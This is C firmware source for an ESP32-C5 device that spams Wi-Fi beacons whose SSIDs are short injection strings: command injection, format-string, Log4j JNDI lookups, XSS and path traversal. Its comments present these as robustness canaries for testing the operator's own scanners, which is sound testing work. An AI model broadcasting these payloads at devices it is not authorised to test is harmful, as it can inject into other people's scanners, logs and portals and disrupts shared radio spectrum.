/*
 * ciw.c — Tier 2 CIW (CMD 26), "SSID-injection" beacon spam for the C5.
 *
 * Same beacon-TX mechanism as beacon_spam.c, but the advertised SSIDs are
 * robustness-fuzzing canaries drawn from built-in payload categories. The
 * point is defensive: an educational RF lab uses it to see how the operator's
 * OWN scanners, loggers, dashboards and captive portals handle hostile SSID
 * text (a 32-byte SSID can't carry a working exploit — these are truncated
 * marker strings that exercise a parser's escaping/bounds handling). Each is
 * clamped to the 32-char 802.11 SSID limit, so none is a functional payload;
 * they are display/log test vectors, like the fuzz strings any security test
 * suite ships.
 *
 * Request: posei_ciw_req_t { channel; duration_ms; category; interval_ms }
 *   category 0=cmd-inject 1=fmt-string 2=log4j 3=xss 4=path-trav
 *   interval_ms: how often to advance to the next SSID in the category
 *   duration_ms: 0 = until STOP (clamped to the 5-min safety cap)
 */
#include "proto.h"
#include "beacon_tx.h"
#include "c5_job.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_now.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "ciw";

extern volatile bool g_pause_hello;

/* Truncated canary strings (<=32 chars) per category — scanner/log robustness
 * test vectors, not working exploits. */
static const char *CIW_CMD[]  = { ";id;", "`reboot`", "$(whoami)", "| ls -la" };
static const char *CIW_FMT[]  = { "%x%x%x%x", "%n%n%n", "%s%s%s%s", "%08x.AAAA" };
static const char *CIW_LOG4J[]= { "${jndi:ldap://canary}", "${sys:user.name}", "${env:PATH}", "${java:version}" };
static const char *CIW_XSS[]  = { "<script>x</script>", "\"><img src=x>", "'><svg onload=1>", "javascript:1" };
static const char *CIW_PATH[] = { "../../../../etc/hosts", "..\\..\\..\\win.ini", "%2e%2e%2fetc", "/../../../../" };

struct ciw_cat_t { const char **ssids; int n; const char *name; };

static struct ciw_cat_t ciw_category(uint8_t cat)
{
    switch (cat) {
    case 0: return (struct ciw_cat_t){ CIW_CMD,   (int)(sizeof(CIW_CMD)/sizeof(CIW_CMD[0])),     "cmd-inject"  };
    case 1: return (struct ciw_cat_t){ CIW_FMT,   (int)(sizeof(CIW_FMT)/sizeof(CIW_FMT[0])),     "fmt-string"  };
    case 2: return (struct ciw_cat_t){ CIW_LOG4J, (int)(sizeof(CIW_LOG4J)/sizeof(CIW_LOG4J[0])), "log4j"       };
    case 3: return (struct ciw_cat_t){ CIW_XSS,   (int)(sizeof(CIW_XSS)/sizeof(CIW_XSS[0])),     "xss"         };
    case 4: return (struct ciw_cat_t){ CIW_PATH,  (int)(sizeof(CIW_PATH)/sizeof(CIW_PATH[0])),   "path-trav"   };
    default:return (struct ciw_cat_t){ CIW_CMD,   (int)(sizeof(CIW_CMD)/sizeof(CIW_CMD[0])),     "cmd-inject"  };
    }
}

struct ciw_ctx_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  channel;
    uint16_t duration_ms;
    uint8_t  category;
    uint16_t interval_ms;
    volatile bool stop;
};
static struct ciw_ctx_t * volatile s_ctx = NULL;
static volatile bool s_running = false;

static void send_status(const uint8_t *requester, uint16_t seq,
                        uint32_t frames_sent, uint8_t ch)
{
    posei_msg_t m;
    proto_init_msg(&m, POSEI_TYPE_RESP_STATUS);
    m.seq = seq;
    memcpy(m.payload, &frames_sent, 4);
    m.payload[4] = ch;
    m.payload_len = 5;

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    proto_send_to(requester, &m);
    vTaskDelay(pdMS_TO_TICKS(2));
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void ciw_task(void *arg)
{
    struct ciw_ctx_t *ctx = (struct ciw_ctx_t *)arg;

    for (int i = 0; i < 30 && s_running; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    s_ctx = ctx;
    s_running = true;

    struct ciw_cat_t cat = ciw_category(ctx->category);
    uint16_t interval = ctx->interval_ms ? ctx->interval_ms : 500;

    led_fx_set(LED_MODE_ATTACK);
    g_pause_hello = true;

    ESP_LOGI(TAG, "CIW ch=%u cat=%s(%u) interval=%ums dur=%ums",
             ctx->channel, cat.name, ctx->category, interval, ctx->duration_ms);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    uint32_t end  = xTaskGetTickCount() +
                    pdMS_TO_TICKS(job_effective_ms(ctx->duration_ms, JOB_SAFETY_CAP_MS));
    uint32_t sent = 0;
    uint32_t last_status = 0;
    uint32_t last_rotate = xTaskGetTickCount();
    uint16_t seqctr = 0;
    int idx = 0;
    uint8_t frame[C5_BEACON_FRAME_MAX];

    while (!ctx->stop && xTaskGetTickCount() < end) {
        const char *ssid = cat.ssids[idx % cat.n];
        uint8_t slen = (uint8_t)strnlen(ssid, 32);
        uint8_t bssid[6];
        c5_ssid_bssid(ssid, slen, bssid);
        int len = c5_build_beacon(frame, bssid, ssid, slen, ctx->channel, seqctr++);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
        sent++;

        if (xTaskGetTickCount() - last_rotate > pdMS_TO_TICKS(interval)) {
            idx++;
            last_rotate = xTaskGetTickCount();
        }
        if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
            send_status(ctx->requester, ctx->seq, sent, ctx->channel);
            last_status = xTaskGetTickCount();
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    send_status(ctx->requester, ctx->seq, sent, ctx->channel);

    esp_wifi_set_promiscuous(false);
    if (s_ctx == ctx) {
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        led_fx_set(LED_MODE_IDLE);
        g_pause_hello = false;
        s_ctx = NULL;
    }
    s_running = false;
    free(ctx);
    vTaskDelete(NULL);
}

void ciw_start(const uint8_t requester[6], const posei_ciw_req_t *req, uint16_t seq)
{
    if (s_ctx) s_ctx->stop = true;

    struct ciw_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) { led_fx_set(LED_MODE_ERROR); return; }
    memcpy(ctx->requester, requester, 6);
    ctx->seq         = seq;
    ctx->channel     = req->channel;
    ctx->duration_ms = req->duration_ms;
    ctx->category    = req->category;
    ctx->interval_ms = req->interval_ms;
    ctx->stop        = false;

    if (xTaskCreate(ciw_task, "ciw", 4096, ctx, 4, NULL) != pdPASS) {
        ESP_LOGE(TAG, "xTaskCreate failed");
        free(ctx);
        led_fx_set(LED_MODE_ERROR);
    }
}

void ciw_stop(void)
{
    if (s_ctx) s_ctx->stop = true;
}
